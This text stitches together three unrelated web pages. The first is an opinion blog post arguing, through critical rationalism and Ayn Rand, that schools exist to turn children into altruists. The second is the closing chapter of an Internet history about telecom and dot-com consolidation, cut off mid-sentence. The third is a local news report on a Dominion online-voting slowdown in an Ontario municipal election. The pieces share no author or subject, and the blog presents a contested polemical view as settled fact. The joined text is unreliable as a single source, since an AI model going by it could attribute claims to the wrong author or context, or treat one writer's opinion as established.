<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bradford West Gwillimbury voters have until Oct. 23 at 8 p.m. to cast their ballots</p><div id="details-body" data-words="437" itemprop="articleBody">
        <p dir="ltr">The company responsible for the online voting system in Bradford West Gwillimbury has blamed the Election Night crash on a slow down caused by a Toronto-based facility.</p>

<p dir="ltr">About 51 municipalities around Ontario started experiencing slow traffic with Dominion Voting Systems around 6 p.m., according to a press release issued by the company late Monday night.</p>

<p dir="ltr">“This load issue was documented, reviewed and determined to be the result of a Toronto-based Internet Colocation provider placing an unauthorized limit on incoming voting traffic that was roughly 1/10th of the system’s designated bandwidth,” read the release.</p>

<p dir="ltr">A co-location provider is a data center facility in which a business can rent space for servers and other computer hardware.</p>

<p dir="ltr">Dominion was unaware of the problem until municipality representatives started contacting it for help and to share complaints from voters, read the release.</p>

<p dir="ltr">“Once we became aware of the problem, Dominion was able to quickly identify the source of the issue and work with the provider to resolve all issues with the system service by 7:30 p.m.,” read the release.</p>

<p dir="ltr">“Unfortunately, the 90-minute slowdown and resulting bandwidth issue caused a varying number of voters to experience slow response times and system time-outs.”</p>

<p dir="ltr">Many communities affected by the crash have extended the voting period. In BWG, residents have until 8 p.m. today to cast their ballots.</p>

<p dir="ltr">The town will also be hosting an Election Night gathering at the Bradford and District Memorial Community Centre at 7:30 p.m.</p>

<p dir="ltr">“Dominion regrets the challenges that our system load issue posed for both election officials and voters alike in today’s elections,” read the Dominion release.</p>

<p dir="ltr">“We want to assure Ontario voters that we will work to ensure this problem does not occur in future elections. It is important to note that at no time was the integrity of the system at risk of compromise, or in any way insecure.”</p>

<p dir="ltr">As of Monday morning, 5,603 votes had been submitted in the BWG municipal election, making up a little more than 23 per cent of the eligible voters, according to Caleigh Clubine, the town’s community relations officer.</p>

<p dir="ltr">At an election gathering Monday evening, several BWG candidates said their confidence in online voting is now lacking.</p>

<p dir="ltr">“If you voted early, it worked really good, (but) you have to have the proper services. You’ll get a large volume (and if you are not prepared for that) you haven’t done your job,” said Ward 4 incumbent Ron Orr.</p>

<p dir="ltr">“Does it shake our confidence in the system? Sure it does,” added Deputy Mayor James Leduc. “I’m frustrated the system wasn’t stress-tested enough. We won’t be strictly online voting again. We’ll have both systems again.”</p>
